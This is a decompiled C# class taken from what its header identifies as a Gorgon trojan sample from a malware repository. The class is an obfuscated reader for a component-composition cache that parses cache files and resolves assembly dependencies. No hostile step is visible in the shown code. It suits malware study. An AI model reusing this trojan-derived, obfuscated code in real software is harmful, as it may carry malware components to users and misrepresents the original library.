// Decompiled with JetBrains decompiler
// Type: 2DVyudQ.BeWDuY7
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using \u0030foHdXo;
using \u0032DVyudQ;
using \u0034zrRrwu;
using \u00366N2IhJ;
using BBHTkZJ;
using BIUYCVz;
using c8S7IfO;
using Di3tgNX;
using eBGzM0r;
using gvMbjW3;
using GVUjcp2;
using iUayWlk;
using jz0haJe;
using li9OdoS;
using MerMFCD;
using odRvpaC;
using OQ1QBLE;
using R4qHaNR;
using RBXKQmo;
using SCjHuPD;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel.Composition.Hosting;
using System.ComponentModel.Composition.Primitives;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security;
using System.Text;
using U8zsCil;
using uPzwHmE;
using vn312U5;
using vR4h26m;
using Wou4xum;
using zi9HJIz;
using ZuqPiTm;

namespace \u0032DVyudQ
{
  internal class BeWDuY7 : fy4pZ9m
  {
    private const int \u00398FGSym = 260;
    private const int \u0031n7Lwmf = 104857600;
    private readonly Encoding bWQpZCH = (Encoding) new UTF8Encoding(true, true);
    private string bCoQFkP;
    private Stream dFfXEEK;
    private IDictionary<int, ICollection<int>> KmzNFDE;
    private HashSet<string> O6aVWRD;
    private Dictionary<int, bool> qR86i0x = new Dictionary<int, bool>();
    private Dictionary<int, Lazy<bool>> slp7Uvh;
    private List<gzMilTR> vPUn1xy;
    private jUU2Be4 \u0035M5VXVl;
    private IDictionary<ComposablePartDefinition, \u0036ag9UIM> ptAeMwq;
    private TLcyhko yHDSNVC;
    private mLfwbPr pXIpsy2;
    private IDictionary<string, string> M1wofOz = (IDictionary<string, string>) new ConcurrentDictionary<string, string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);

    internal BeWDuY7(string cacheFilePath, jUU2Be4 host)
    {
      if (cacheFilePath == null)
        throw new ArgumentNullException(nameof (cacheFilePath));
      if (host == null)
        throw new ArgumentNullException(nameof (host));
      this.bCoQFkP = cacheFilePath;
      this.\u0035M5VXVl = host;
      this.dFfXEEK = (Stream) new FileStream(cacheFilePath, FileMode.Open, FileAccess.Read, FileShare.Read | FileShare.Delete);
      this.yHDSNVC = new TLcyhko(new NQCvlun(this.M1wofOz), (IEnumerable<object>) cvsquDh.Sryla4z, this.dFfXEEK, this.bWQpZCH);
    }

    internal BeWDuY7(Stream stream, jUU2Be4 host)
    {
      this.dFfXEEK = stream;
      this.\u0035M5VXVl = host;
    }

    public IDictionary<ComposablePartDefinition, \u0036ag9UIM> \u0035glwV99 => this.ptAeMwq;

    public IDictionary<string, string> Ld4EZzM => this.M1wofOz;

    public bool? XUQjNqj { get; set; }

    public IDictionary<string, YkBa6Sd> hKG0fLC { get; private set; }

    public bool \u0033UShIkd { get; set; }

    public string cWEX9Il
    {
      get => this.bCoQFkP;
      set => this.bCoQFkP = value != null ? value : throw new ArgumentNullException(nameof (value));
    }

    protected virtual object l3KkJ2s => throw new NotImplementedException();

    public virtual ComposablePartCatalog mRxboD2(object h7qUEqD) => (ComposablePartCatalog) new \u00319427NS(this.ReadCacheCore(h7qUEqD), this.\u0035M5VXVl, this.ptAeMwq);

    public virtual bool \u0033hGwbGG(object MrRoP0F, IDictionary<string, object> iALkWOd = null)
    {
      bool? xuQjNqj = this.XUQjNqj;
      bool flag = false;
      return !(xuQjNqj.GetValueOrDefault() == flag & xuQjNqj.HasValue) && this.\u0030pmd3Sa((int) MrRoP0F, new HashSet<int>(), iALkWOd);
    }

    internal static int qsacz7N(Stream _param0, byte[] xHCZt7m, int RpaxXFQ, int _param3)
    {
      if (_param0 == null)
        throw new ArgumentNullException("stream");
      int count = _param3 >= 0 ? _param3 : throw new ArgumentOutOfRangeException("count");
      int num1 = 0;
      int num2;
      for (; count > 0; count -= num2)
      {
        num2 = _param0.Read(xHCZt7m, RpaxXFQ + num1, count);
        if (num2 != 0)
          num1 += num2;
        else
          break;
      }
      return num1;
    }

    internal string jYrpasT(int LUAj71Z)
    {
      int length = this.lPW9IiA();
      if (length < -1 || length > LUAj71Z)
      {
        this.RtVZn2e();
        return (string) null;
      }
      if (length == -1)
        return (string) null;
      byte[] bytes = new byte[length];
      this.RXlPCzT(bytes);
      return this.bWQpZCH.GetString(bytes);
    }

    internal void \u0031RhBYdj(ComposablePartDefinition fIDwlHI, object QA2BDY0, int linWZiY)
    {
      int num = (int) QA2BDY0;
      this.syZm31O(fIDwlHI, new \u0036ag9UIM()
      {
        \u0031S8z0HD = num,
        zzR5o85 = linWZiY
      });
    }

    internal void syZm31O(ComposablePartDefinition gfDDmRU, \u0036ag9UIM IVoJURo) => this.ptAeMwq[gfDDmRU] = IVoJURo;

    internal bool SerHCqX(out long bOkzGgf)
    {
      bOkzGgf = 0L;
      if (this.dFfXEEK.Length > 104857600L)
      {
        this.\u0035M5VXVl.\u00340C4Zbq(\u0037jxjFzS.Warning, MykOU9k.oipwyrq, this.cWEX9Il);
        return false;
      }
      string fullName = Assembly.GetExecutingAssembly().FullName;
      this.dFfXEEK.Seek(0L, SeekOrigin.Begin);
      if (this.yHDSNVC.MzOE64S() != fullName || this.yHDSNVC.ReadInt32() != CultureInfo.CurrentUICulture.LCID || this.\u0035g2pZ5J() != 23U)
        return false;
      long num1 = this.yHDSNVC.ReadInt64();
      long num2 = this.\u0035M5VXVl.\u0033Tx9kQI;
      if (num2 >= 0L)
      {
        if (num1 == num2)
          this.XUQjNqj = new bool?(true);
        else
          this.\u0033UShIkd = true;
      }
      long wE4Xkrm = this.\u0035M5VXVl.wE4XKrm;
      if (wE4Xkrm > 0L)
      {
        DateTime lastWriteTime = File.GetLastWriteTime(this.bCoQFkP);
        if (DateTime.FromFileTime(wE4Xkrm) > lastWriteTime)
          return false;
      }
      bOkzGgf = this.CwBOqUR();
      return bOkzGgf != 0L;
    }

    internal void jgrYDxF() => this.KmzNFDE = cvsquDh.CT4J72g<int>(this.KmzNFDE);

    internal IEnumerable<string> v7EPDd8(IEnumerable<string> MrFYZZt)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      N0I5jr4.F8DsGL3 f8DsGl3 = new N0I5jr4.F8DsGL3(-2);
      // ISSUE: reference to a compiler-generated field
      ((BeWDuY7.\u0036bJILCS) f8DsGl3).NJRlGIi = this;
      // ISSUE: reference to a compiler-generated field
      ((BeWDuY7.\u0036bJILCS) f8DsGl3).\u0033EjZtID = MrFYZZt;
      return (IEnumerable<string>) f8DsGl3;
    }

    internal IEnumerable<string> vmdAmlm(IEnumerable<string> H4lC7Oy)
    {
      List<string> source = new List<string>(this.v7EPDd8(H4lC7Oy));
      foreach (string str in source.Select<string, string>((Func<string, string>) (kIIhzMR => kIIhzMR.qqPqmGg(true))))
      {
        try
        {
          if (File.Exists(str))
            cvsquDh.QP4zkVW<int>(this.KmzNFDE, StringComparer.OrdinalIgnoreCase.GetHashCode(AssemblyName.GetAssemblyName(str).Name), -1);
        }
        catch (Exception ex)
        {
          switch (ex)
          {
            case ArgumentException _:
            case FileNotFoundException _:
            case SecurityException _:
            case BadImageFormatException _:
            case FileLoadException _:
              continue;
            default:
              throw;
          }
        }
      }
      return (IEnumerable<string>) source;
    }

    internal zINRWpL pSkaM0w(long Yy4vGLc)
    {
      this.\u0030lHddHs();
      IDictionary<string, int> vkMKL7i;
      List<YkBa6Sd> w39ySc7;
      List<YkBa6Sd> VrIjqMJ;
      this.sAXlJ4J(Yy4vGLc, out vkMKL7i, out w39ySc7, out VrIjqMJ);
      return new zINRWpL(this, vkMKL7i, (IList<YkBa6Sd>) w39ySc7, (IList<YkBa6Sd>) VrIjqMJ);
    }

    internal CompositionScopeDefinition Mf5FE4G(
      ComposablePartCatalog v7RuovJ)
    {
      return (CompositionScopeDefinition) new Yr37twt(this, this.pXIpsy2, v7RuovJ);
    }

    internal IDictionary<string, object> ONwec5B(object wKwENKW) => (IDictionary<string, object>) new upeMz4J(new AV4Iptg(this.vPUn1xy[(int) wKwENKW]));

    internal QmEgsrn UsTLWt0(object Nen7siK)
    {
      string empty = string.Empty;
      try
      {
        gzMilTR gzMilTr = this.vPUn1xy[(int) Nen7siK];
        string coHpFeR = gzMilTr.CoHpFeR;
        long fTjFlMv = gzMilTr.fTjFlMV;
        if (gzMilTr.tOcBTrV == 0L)
          return new QmEgsrn();
        this.dFfXEEK.Seek(fTjFlMv, SeekOrigin.Begin);
        using (this.yHDSNVC.FUobHQG())
          return this.yHDSNVC.JYKVH8a<QmEgsrn>();
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.\u0035M5VXVl, ex, this.cWEX9Il);
        this.\u0035M5VXVl.\u00340C4Zbq(\u0037jxjFzS.Error, MykOU9k.iCj8FGo, this.cWEX9Il);
        throw new InvalidDataException(ex.Message, ex);
      }
    }

    internal bool k5xgt0l(mLfwbPr _param1, ComposablePartDefinition KOdi2DA)
    {
      \u0036ag9UIM TAXM77B;
      return this.iZYft99(KOdi2DA, out TAXM77B) && _param1.\u0031O70BYd.Contains(TAXM77B);
    }

    internal bool iZYft99(ComposablePartDefinition WmHuat0, out \u0036ag9UIM TAXM77B) => this.ptAeMwq.TryGetValue(WmHuat0, out TAXM77B);

    protected override U3VYzxU ReadCacheCore(object cacheToken) => cacheToken != null ? (U3VYzxU) new GppkhAB(this, (object) (int) cacheToken) : throw new ArgumentNullException(nameof (cacheToken));

    protected override void Dispose(bool disposing)
    {
      if (this.yHDSNVC != null)
      {
        this.yHDSNVC.Dispose();
        this.yHDSNVC = (TLcyhko) null;
      }
      if (this.dFfXEEK != null)
      {
        this.dFfXEEK.Close();
        this.dFfXEEK = (Stream) null;
      }
      base.Dispose(disposing);
    }

    private void \u0030lHddHs()
    {
      using (this.yHDSNVC.FUobHQG())
        this.yHDSNVC.oiUKtfM<KeyValuePair<string, string>>((Func<IReader, KeyValuePair<string, string>>) (jeINVN3 => new KeyValuePair<string, string>(jeINVN3.ReadString(), jeINVN3.ReadString())), (ICollection<KeyValuePair<string, string>>) this.M1wofOz);
    }

    private void sAXlJ4J(
      long udkVlIi,
      out IDictionary<string, int> vkMKL7i,
      out List<YkBa6Sd> w39ySc7,
      out List<YkBa6Sd> VrIjqMJ)
    {
      this.R4XHd9K(udkVlIi);
      this.ptAeMwq = (IDictionary<ComposablePartDefinition, \u0036ag9UIM>) new Dictionary<ComposablePartDefinition, \u0036ag9UIM>();
      this.O6aVWRD = new HashSet<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      JMBpZHP JQppxiC;
      using (this.yHDSNVC.FUobHQG())
        JQppxiC = this.yHDSNVC.JYKVH8a<JMBpZHP>();
      this.pXIpsy2 = JQppxiC.nTXyZkX;
      this.hKG0fLC = JQppxiC.\u0036Xkphkm;
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: reference to a compiler-generated method
      this.slp7Uvh = this.hKG0fLC.GroupBy<KeyValuePair<string, YkBa6Sd>, int, YkBa6Sd>((Func<KeyValuePair<string, YkBa6Sd>, int>) (UU5GRcQ => StringComparer.OrdinalIgnoreCase.GetHashCode(new AssemblyName(UU5GRcQ.Key).Name)), (Func<KeyValuePair<string, YkBa6Sd>, YkBa6Sd>) (rS9yPyw => rS9yPyw.Value)).ToDictionary<IGrouping<int, YkBa6Sd>, int, Lazy<bool>>((Func<IGrouping<int, YkBa6Sd>, int>) (XwDl9ds => XwDl9ds.Key), (Func<IGrouping<int, YkBa6Sd>, Lazy<bool>>) (hq4Fh4C => new Lazy<bool>(new Func<bool>(((BeWDuY7.\u0035L3giYj) new BeWDuY7.\u0039UEWM5P()
      {
        Esku6hn = hq4Fh4C
      }).LVozrtx))));
      this.l2WDXmq(udkVlIi, JQppxiC, out vkMKL7i);
      VrIjqMJ = JQppxiC.BB8IJtZ;
      this.aaPmVbd(VrIjqMJ);
      w39ySc7 = JQppxiC.qyEvWqY;
      this.aaPmVbd(w39ySc7);
      w39ySc7.AddRange((IEnumerable<YkBa6Sd>) this.vPUn1xy);
    }

    private void l2WDXmq(long GQqs9Zw, JMBpZHP JQppxiC, out IDictionary<string, int> ooc7JXH)
    {
      ooc7JXH = (IDictionary<string, int>) new Dictionary<string, int>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      this.vPUn1xy = JQppxiC.C0z9nvd;
      this.KmzNFDE = (IDictionary<int, ICollection<int>>) new Dictionary<int, ICollection<int>>();
      long num = 0;
      for (int index = 0; index < this.vPUn1xy.Count; ++index)
      {
        gzMilTR gzMilTr = this.vPUn1xy[index];
        long fTjFlMv = gzMilTr.fTjFlMV;
        ooc7JXH.Add(gzMilTr.CoHpFeR, index);
        cvsquDh.QP4zkVW<int>(this.KmzNFDE, gzMilTr.aiBO8Ti, index);
        this.O6aVWRD.Add(gzMilTr.CoHpFeR);
        if (index > 0)
          this.vPUn1xy[index - 1].tOcBTrV = fTjFlMv - num;
        if (index == this.vPUn1xy.Count - 1)
          this.vPUn1xy[index].tOcBTrV = GQqs9Zw - fTjFlMv;
        num = fTjFlMv;
      }
    }

    private void aaPmVbd(List<YkBa6Sd> spGOOXl)
    {
      foreach (YkBa6Sd ykBa6Sd in spGOOXl)
        this.O6aVWRD.Add(ykBa6Sd.CoHpFeR);
    }

    private int alQSuVy()
    {
      int num = this.lPW9IiA();
      if (num < 0 || (long) num > this.dFfXEEK.Length - this.dFfXEEK.Position)
        this.RtVZn2e();
      return num;
    }

    private uint \u0035g2pZ5J()
    {
      byte[] numArray = new byte[4];
      this.RXlPCzT(numArray);
      return BitConverter.ToUInt32(numArray, 0);
    }

    private int lPW9IiA()
    {
      byte[] numArray = new byte[4];
      this.RXlPCzT(numArray);
      return BitConverter.ToInt32(numArray, 0);
    }

    private long CwBOqUR()
    {
      byte[] numArray = new byte[8];
      this.RXlPCzT(numArray);
      return BitConverter.ToInt64(numArray, 0);
    }

    private string D9Ly69Z() => this.jYrpasT(260);

    private void R4XHd9K(long _param1)
    {
      if (this.dFfXEEK.Seek(_param1, SeekOrigin.Begin) == _param1)
        return;
      this.RtVZn2e();
    }

    private void RtVZn2e()
    {
      this.\u0035M5VXVl.\u00340C4Zbq(\u0037jxjFzS.Error, MykOU9k.pBPHR2c, this.cWEX9Il);
      throw new InvalidDataException(MykOU9k.pBPHR2c);
    }

    private void RXlPCzT(byte[] _param1)
    {
      if (BeWDuY7.qsacz7N(this.dFfXEEK, _param1, 0, _param1.Length) == _param1.Length)
        return;
      this.RtVZn2e();
    }

    private bool \u0030pmd3Sa(
      int i1kmFSv,
      HashSet<int> _param2,
      IDictionary<string, object> XytkXE9 = null)
    {
      if (!_param2.Add(i1kmFSv))
        return true;
      bool flag = false;
      if (this.qR86i0x.TryGetValue(i1kmFSv, out flag))
        return flag;
      flag = this.N9owqb1(i1kmFSv, _param2, XytkXE9);
      this.qR86i0x[i1kmFSv] = flag;
      return flag;
    }

    private bool N9owqb1(int SsNEo1M, HashSet<int> Tj44Z5k, IDictionary<string, object> WkQlpBy = null)
    {
      if (WkQlpBy == null)
        WkQlpBy = this.ONwec5B((object) SsNEo1M);
      gzMilTR gzMilTr = gzMilTR.NTTE7I6(WkQlpBy);
      bool? xuQjNqj = this.XUQjNqj;
      bool flag = true;
      if (!(xuQjNqj.GetValueOrDefault() == flag & xuQjNqj.HasValue) && !WkQlpBy.Cuy4qeV())
        return false;
      foreach (int key in gzMilTr.bK3Bhb7)
      {
        Lazy<bool> lazy;
        if (this.slp7Uvh.TryGetValue(key, out lazy) && !lazy.Value)
          return false;
        ICollection<int> ints;
        if (this.KmzNFDE.TryGetValue(key, out ints))
        {
          foreach (int i1kmFSv in (IEnumerable<int>) ints)
          {
            if (i1kmFSv == -1 || !this.\u0030pmd3Sa(i1kmFSv, Tj44Z5k))
              return false;
          }
        }
      }
      return true;
    }
  }
}
